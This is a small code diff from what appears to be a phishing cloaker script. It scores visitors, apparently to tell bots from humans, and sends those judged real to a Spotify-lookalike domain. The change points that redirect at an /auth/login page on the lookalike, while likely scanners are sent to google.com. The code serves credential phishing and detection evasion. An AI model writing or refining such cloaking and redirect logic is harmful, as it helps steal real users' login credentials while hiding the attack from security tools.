@@ -78,7 +78,7 @@
                 if (elapsedTime < 1) s += 1; // Only penalize extremely fast access
 
                 // Prepare redirect URLs with tracking parameters
-                const baseReal = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io';
+                const baseReal = 'https://spotify.qzz.io/tracker/click.php?goto=https://spotify.qzz.io/auth/login';
                 const baseSafe = 'https://google.com';
                 const jsParam = '&js=1';
                 const delayParam = `&delay=${elapsedTime.toFixed(2)}`;
